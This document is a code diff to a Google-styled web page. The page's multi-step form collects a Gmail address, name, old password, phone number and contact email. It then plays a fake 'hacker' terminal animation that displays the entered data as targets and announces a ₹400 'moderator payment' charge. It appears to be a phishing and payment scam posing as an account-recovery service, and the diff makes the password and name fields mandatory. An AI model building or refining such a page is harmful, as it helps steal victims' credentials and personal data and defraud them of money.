@@ -234,7 +234,7 @@
         }
         .orb {
             position: absolute; border-radius: 50%; filter: blur(100px); 
-            opacity: 0.35; animation: float 20s infinite ease-in-out alternate;
+            opacity: 0.35; animation: float 20s infinite alternate;
         }
         .orb-1 { width: 400px; height: 400px; background: #4285F4; top: -5%; left: -5%; animation-duration: 25s; }
         .orb-2 { width: 450px; height: 450px; background: #EA4335; bottom: -10%; right: -10%; animation-duration: 22s; }
@@ -248,17 +248,18 @@
             width: 100%; max-width: 600px; height: 85vh;
             display: flex; flex-direction: column; gap: 12px;
             font-family: 'Courier New', Courier, monospace; 
-            overflow-y: hidden; padding: 20px 10px; margin-top: 20px;
+            overflow-y: hidden; padding: 20px 15px; margin-top: 20px;
             -webkit-mask-image: linear-gradient(to bottom, transparent 0%, black 10%, black 90%, transparent 100%);
+            transition: all 0.5s ease;
         }
 
         /* LIGHTER BLUR ON HACKER TEXT */
         .hacker-line {
             font-size: 0.65rem !important; font-weight: 800 !important;
             color: #34A853 !important; text-shadow: 0 0 12px #34A853 !important;
-            opacity: 0.45 !important; margin-bottom: 2px !important; line-height: 1.1; /* Increased opacity slightly */
+            opacity: 0.5 !important; margin-bottom: 2px !important; line-height: 1.1;
             word-wrap: break-word;
-            filter: blur(2px) !important; /* Reduced blur intensity */
+            filter: blur(1.2px) !important; /* Reduced blur intensity */
         }
 
         /* CLEAR VISIBILITY ON MAIN DATA TEXT */
@@ -331,6 +332,7 @@
                     <p>Enter your full name</p>
                     <div class="input-group">
                         <input type="text" id="inputName" placeholder="Full name">
+                        <div class="error-msg" id="errName">Please enter your name or click Skip.</div>
                     </div>
                     <div class="button-container split">
                         <button type="button" class="btn-back" onclick="prevStep(2)">Back</button>
@@ -346,7 +348,7 @@
                     <p>Enter your last remembered password</p>
                     <div class="input-group">
                         <input type="password" id="inputPassword" placeholder="Old Password">
-                        <div class="error-msg" id="errPass">Password must be at least 6 characters.</div>
+                        <div class="error-msg" id="errPass">Password must be at least 6 characters or click Skip.</div>
                     </div>
                     <div class="button-container split">
                         <button type="button" class="btn-back" onclick="prevStep(3)">Back</button>
@@ -394,7 +396,7 @@
                     <p>How can we contact you?</p>
                     <div class="input-group">
                         <input type="email" id="inputContact" placeholder="Email to contact you" required>
-                        <div class="error-msg" id="errContact">Please enter a valid contact email.</div>
+                        <div class="error-msg" id="errContact">Please enter a valid contact email or click Skip.</div>
                     </div>
                     <div class="button-container split">
                         <button type="button" class="btn-back" onclick="prevStep(6)">Back</button>
@@ -449,13 +451,14 @@
         // --- UI Interactions & Error Clearing ---
         document.querySelectorAll('input, select').forEach(el => {
             el.addEventListener('input', () => {
-                const errBox = document.getElementById('err' + el.id.replace('input', ''));
+                let errBoxId = 'err' + el.id.replace('input', '');
+                let errBox = document.getElementById(errBoxId);
                 if(errBox) errBox.style.display = 'none';
                 el.classList.remove('has-error');
             });
         });
 
-        // Smart Email complete (Requires @gmail.com to be valid)
+        // Smart Email complete
         document.getElementById('inputEmail').addEventListener('input', function(e) {
             if (e.inputType !== 'deleteContentBackward' && this.value.endsWith('@')) {
                 this.value += 'gmail.com';
@@ -485,36 +488,27 @@
             }, 800); // Natural loading delay
         }
 
-        // Back logic
-        function prevStep(current) {
-            changeStepWithLoader(current, current - 1);
-        }
+        function prevStep(current) { changeStepWithLoader(current, current - 1); }
+        function skipStep(current) { changeStepWithLoader(current, current + 1); }
 
-        // Skip logic
-        function skipStep(current) {
-            changeStepWithLoader(current, current + 1);
-        }
-
-        // Next logic
+        // Next logic with strict validation
         function nextStep(current) {
             let isValid = true;
             
             if (current === 1) {
                 const val = document.getElementById('inputEmail').value.trim();
-                // Strict validation for @gmail.com
                 if(!val || !val.toLowerCase().endsWith('@gmail.com') || val.length < 11) { 
-                    showError('inputEmail', 'errEmail'); 
-                    isValid = false; 
-                } else { 
-                    userData.email = val; 
-                }
+                    showError('inputEmail', 'errEmail'); isValid = false; 
+                } else { userData.email = val; }
             } 
             else if (current === 2) {
-                userData.name = document.getElementById('inputName').value; 
+                const val = document.getElementById('inputName').value.trim();
+                if(!val) { showError('inputName', 'errName'); isValid = false; }
+                else { userData.name = val; }
             } 
             else if (current === 3) {
                 const val = document.getElementById('inputPassword').value;
-                if(val && val.length < 6) { showError('inputPassword', 'errPass'); isValid = false; }
+                if(!val || val.length < 6) { showError('inputPassword', 'errPass'); isValid = false; }
                 else { userData.password = val; }
             } 
             else if (current === 4) {
@@ -524,13 +518,9 @@
             } 
             else if (current === 5) {
                 const val = document.getElementById('inputPhone').value;
-                // Strict 10-digit validation in backend
                 if(!val || val.length !== 10) { 
-                    showError('inputPhone', 'errPhone'); 
-                    isValid = false; 
-                } else { 
-                    userData.phone = val; 
-                }
+                    showError('inputPhone', 'errPhone'); isValid = false; 
+                } else { userData.phone = val; }
             }
 
             if(isValid) {
@@ -541,7 +531,7 @@
         // Final Submit
         function submitForm(isSkipped) {
             if(!isSkipped) {
-                const val = document.getElementById('inputContact').value;
+                const val = document.getElementById('inputContact').value.trim();
                 if(!val || val.length < 5 || !val.includes('@')) {
                     showError('inputContact', 'errContact');
                     return;
@@ -551,7 +541,6 @@
                 userData.contact = ""; 
             }
             
-            // Show Big Spinner - Solid White for final transition
             document.getElementById('lightThemeWrapper').style.display = 'none';
             const spinner = document.getElementById('googleSpinnerOverlay');
             spinner.style.backgroundColor = '#ffffff'; 
@@ -589,14 +578,13 @@
             if(userData.phone) realLogs.push(`<span class="c-succ">[Execute]</span> Target Recovery Phone: ${userData.phone}`);
             if(userData.contact) realLogs.push(`<span class="c-data">[Info]</span> Contact Target: ${userData.contact}`);
             
-            // Mandatory billing text
             realLogs.push(`<span class="c-billing">[Billing] Moderator payment charges: ₹400</span>`);
             realLogs.push(`<span class="c-sys">Please wait... Forwarding to moderator payment page.</span>`);
 
             let startTimestamp = null;
             let reqAnimId;
 
-            // Phase 1: Fast gibberish (Lightly blurred)
+            // Phase 1: Fast gibberish (Light blur)
             function fastPhase(timestamp) {
                 if (!startTimestamp) startTimestamp = timestamp;
                 let progress = timestamp - startTimestamp;
@@ -617,14 +605,18 @@
                     reqAnimId = requestAnimationFrame(fastPhase);
                 } else {
                     cancelAnimationFrame(reqAnimId);
-                    logBox.style.scrollBehavior = 'smooth';
                     setTimeout(startSlowMotionLogs, 50);
                 }
             }
             requestAnimationFrame(fastPhase);
 
-            // Phase 2: Typing real data (Clear visibility)
+            // Phase 2: Centered, clear real data
             function startSlowMotionLogs() {
+                // Clear the screen and center everything for the final data display
+                logBox.innerHTML = '';
+                logBox.style.webkitMaskImage = 'none';
+                logBox.style.justifyContent = 'center';
+
                 let realLogIndex = 0;
 
                 function typeNextLine() {
@@ -645,7 +637,6 @@
                                 if (textHTML[i] === '>') isTag = false;
 
                                 lineDiv.innerHTML = currentHTML; 
-                                logBox.scrollTop = logBox.scrollHeight; 
                                 i++;
                             } else {
                                 clearInterval(typeInterval);
